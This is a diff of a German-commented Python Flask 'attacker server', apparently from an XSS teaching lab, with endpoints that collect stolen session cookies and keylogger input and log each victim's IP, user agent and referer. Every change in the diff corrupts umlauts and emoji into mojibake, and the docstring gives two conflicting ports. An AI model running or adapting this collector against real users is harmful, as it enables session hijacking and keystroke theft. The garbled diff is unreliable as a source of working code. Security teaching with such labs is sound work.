@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-ATTACKER SERVER - NUR FÜR BILDUNGSZWECKE
+ATTACKER SERVER - NUR FÃR BILDUNGSZWECKE
 =========================================
-Dieser Server läuft auf einem separaten Port (8888) und empfängt:
+Dieser Server lÃ¤uft auf einem separaten Port (8888) und empfÃ¤ngt:
 - Gestohlene Cookies
 - Keylogger-Daten
 
 USAGE:
     python attacker_server.py
 
-Der Server läuft dann auf: http://127.0.0.1:9999
+Der Server lÃ¤uft dann auf: http://127.0.0.1:9999
 """
 
 from flask import Flask, request
@@ -22,25 +22,25 @@ app = Flask(__name__)
 # CORS aktivieren - erlaubt Cross-Origin Requests von der verwundbaren App
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Dateien für Logging
+# Dateien fÃ¼r Logging
 COOKIE_LOG = "stolen_cookies.txt"
 KEYLOG_FILE = "keylog.txt"
 
 # Banner beim Start
 BANNER = """
-╔══════════════════════════════════════════════════════════╗
-║                                                          ║
-║           🎯 ATTACKER SERVER GESTARTET 🎯               ║
-║                                                          ║
-║  Port: 9999                                              ║
-║  Endpoints:                                              ║
-║    • /steal_cookie  (GET/POST)                           ║
-║    • /steal         (GET/POST) - Alias                   ║
-║    • /log_keys      (POST)                               ║
-║                                                          ║
-║  ⚠️  NUR FÜR BILDUNGSZWECKE                              ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
+ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+â                                                          â
+â           ð¯ ATTACKER SERVER GESTARTET ð¯               â
+â                                                          â
+â  Port: 9999                                              â
+â  Endpoints:                                              â
+â    â¢ /steal_cookie  (GET/POST)                           â
+â    â¢ /steal         (GET/POST) - Alias                   â
+â    â¢ /log_keys      (POST)                               â
+â                                                          â
+â  â ï¸  NUR FÃR BILDUNGSZWECKE                              â
+â                                                          â
+ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
 """
 
 def log_to_file(filename, message):
@@ -57,15 +57,15 @@ def print_separator():
 def index():
     """Statusseite"""
     return """
-    <h1>🎯 Attacker Server</h1>
+    <h1>ð¯ Attacker Server</h1>
     <p>Status: <span style="color:green">ONLINE</span></p>
-    <h2>Verfügbare Endpoints:</h2>
+    <h2>VerfÃ¼gbare Endpoints:</h2>
     <ul>
-        <li><code>/steal_cookie</code> - Empfängt gestohlene Cookies</li>
-        <li><code>/steal</code> - Alias für /steal_cookie</li>
-        <li><code>/log_keys</code> - Empfängt Keylogger-Daten</li>
+        <li><code>/steal_cookie</code> - EmpfÃ¤ngt gestohlene Cookies</li>
+        <li><code>/steal</code> - Alias fÃ¼r /steal_cookie</li>
+        <li><code>/log_keys</code> - EmpfÃ¤ngt Keylogger-Daten</li>
     </ul>
-    <p><strong>⚠️ NUR FÜR BILDUNGSZWECKE</strong></p>
+    <p><strong>â ï¸ NUR FÃR BILDUNGSZWECKE</strong></p>
     """, 200
 
 @app.route("/steal_cookie", methods=["GET", "POST"])
@@ -77,7 +77,7 @@ def steal_cookie():
     # Cookie aus GET oder POST holen
     cookie = request.args.get("c") or request.form.get("c", "")
 
-    # Zusätzliche Informationen sammeln
+    # ZusÃ¤tzliche Informationen sammeln
     victim_ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
     referer = request.headers.get("Referer", "Unknown")
@@ -110,7 +110,7 @@ def steal():
     # Cookie aus GET oder POST holen
     cookie = request.args.get("c") or request.form.get("c", "")
 
-    # Zusätzliche Informationen sammeln
+    # ZusÃ¤tzliche Informationen sammeln
     victim_ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
     referer = request.headers.get("Referer", "Unknown")
@@ -145,7 +145,7 @@ def log_keys():
     referer = request.headers.get("Referer", "Unknown")
 
     if keys:
-        print(f"⌨️  KEYLOG [{datetime.now().strftime('%H:%M:%S')}] [{victim_ip}]: {keys}")
+        print(f"â¨ï¸  KEYLOG [{datetime.now().strftime('%H:%M:%S')}] [{victim_ip}]: {keys}")
 
         # In Datei loggen
         log_message = f"IP: {victim_ip} | Keys: {keys} | Ref: {referer}"
@@ -178,13 +178,13 @@ if __name__ == "__main__":
         with open(KEYLOG_FILE, "w") as f:
             f.write(f"# Keylogger Log - Erstellt: {datetime.now()}\n")
 
-    print("📝 Logdateien:")
-    print(f"   • Cookies:   {os.path.abspath(COOKIE_LOG)}")
-    print(f"   • Keylogs:   {os.path.abspath(KEYLOG_FILE)}")
-    print("\n🚀 Server startet...\n")
+    print("ð Logdateien:")
+    print(f"   â¢ Cookies:   {os.path.abspath(COOKIE_LOG)}")
+    print(f"   â¢ Keylogs:   {os.path.abspath(KEYLOG_FILE)}")
+    print("\nð Server startet...\n")
 
     # Server auf Port 9999 starten
-    # host='0.0.0.0' erlaubt Zugriff von anderen Geräten im Netzwerk
+    # host='0.0.0.0' erlaubt Zugriff von anderen GerÃ¤ten im Netzwerk
     app.run(
         debug=True,
         host='0.0.0.0',
